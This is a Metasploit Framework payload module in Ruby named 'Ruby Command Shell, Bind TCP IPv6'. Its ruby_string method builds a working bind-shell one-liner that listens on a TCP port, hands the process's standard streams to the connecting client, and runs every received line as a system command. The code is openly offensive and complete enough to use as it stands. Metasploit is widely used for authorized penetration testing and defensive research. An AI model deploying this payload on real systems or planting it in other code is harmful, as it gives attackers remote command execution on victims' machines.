##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/ruby'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 524

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Ruby Command Shell, Bind TCP IPv6',
      'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
      'Author'      => [ 'kris katterjohn', 'hdm' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'ruby',
      'Arch'        => ARCH_RUBY,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return prepends(ruby_string)
  end

  def ruby_string
    "require 'socket';s=TCPServer.new(\"::\",#{datastore['LPORT'].to_i});c=s.accept;s.close;" +
    "$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;" +
    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }"
  end
end
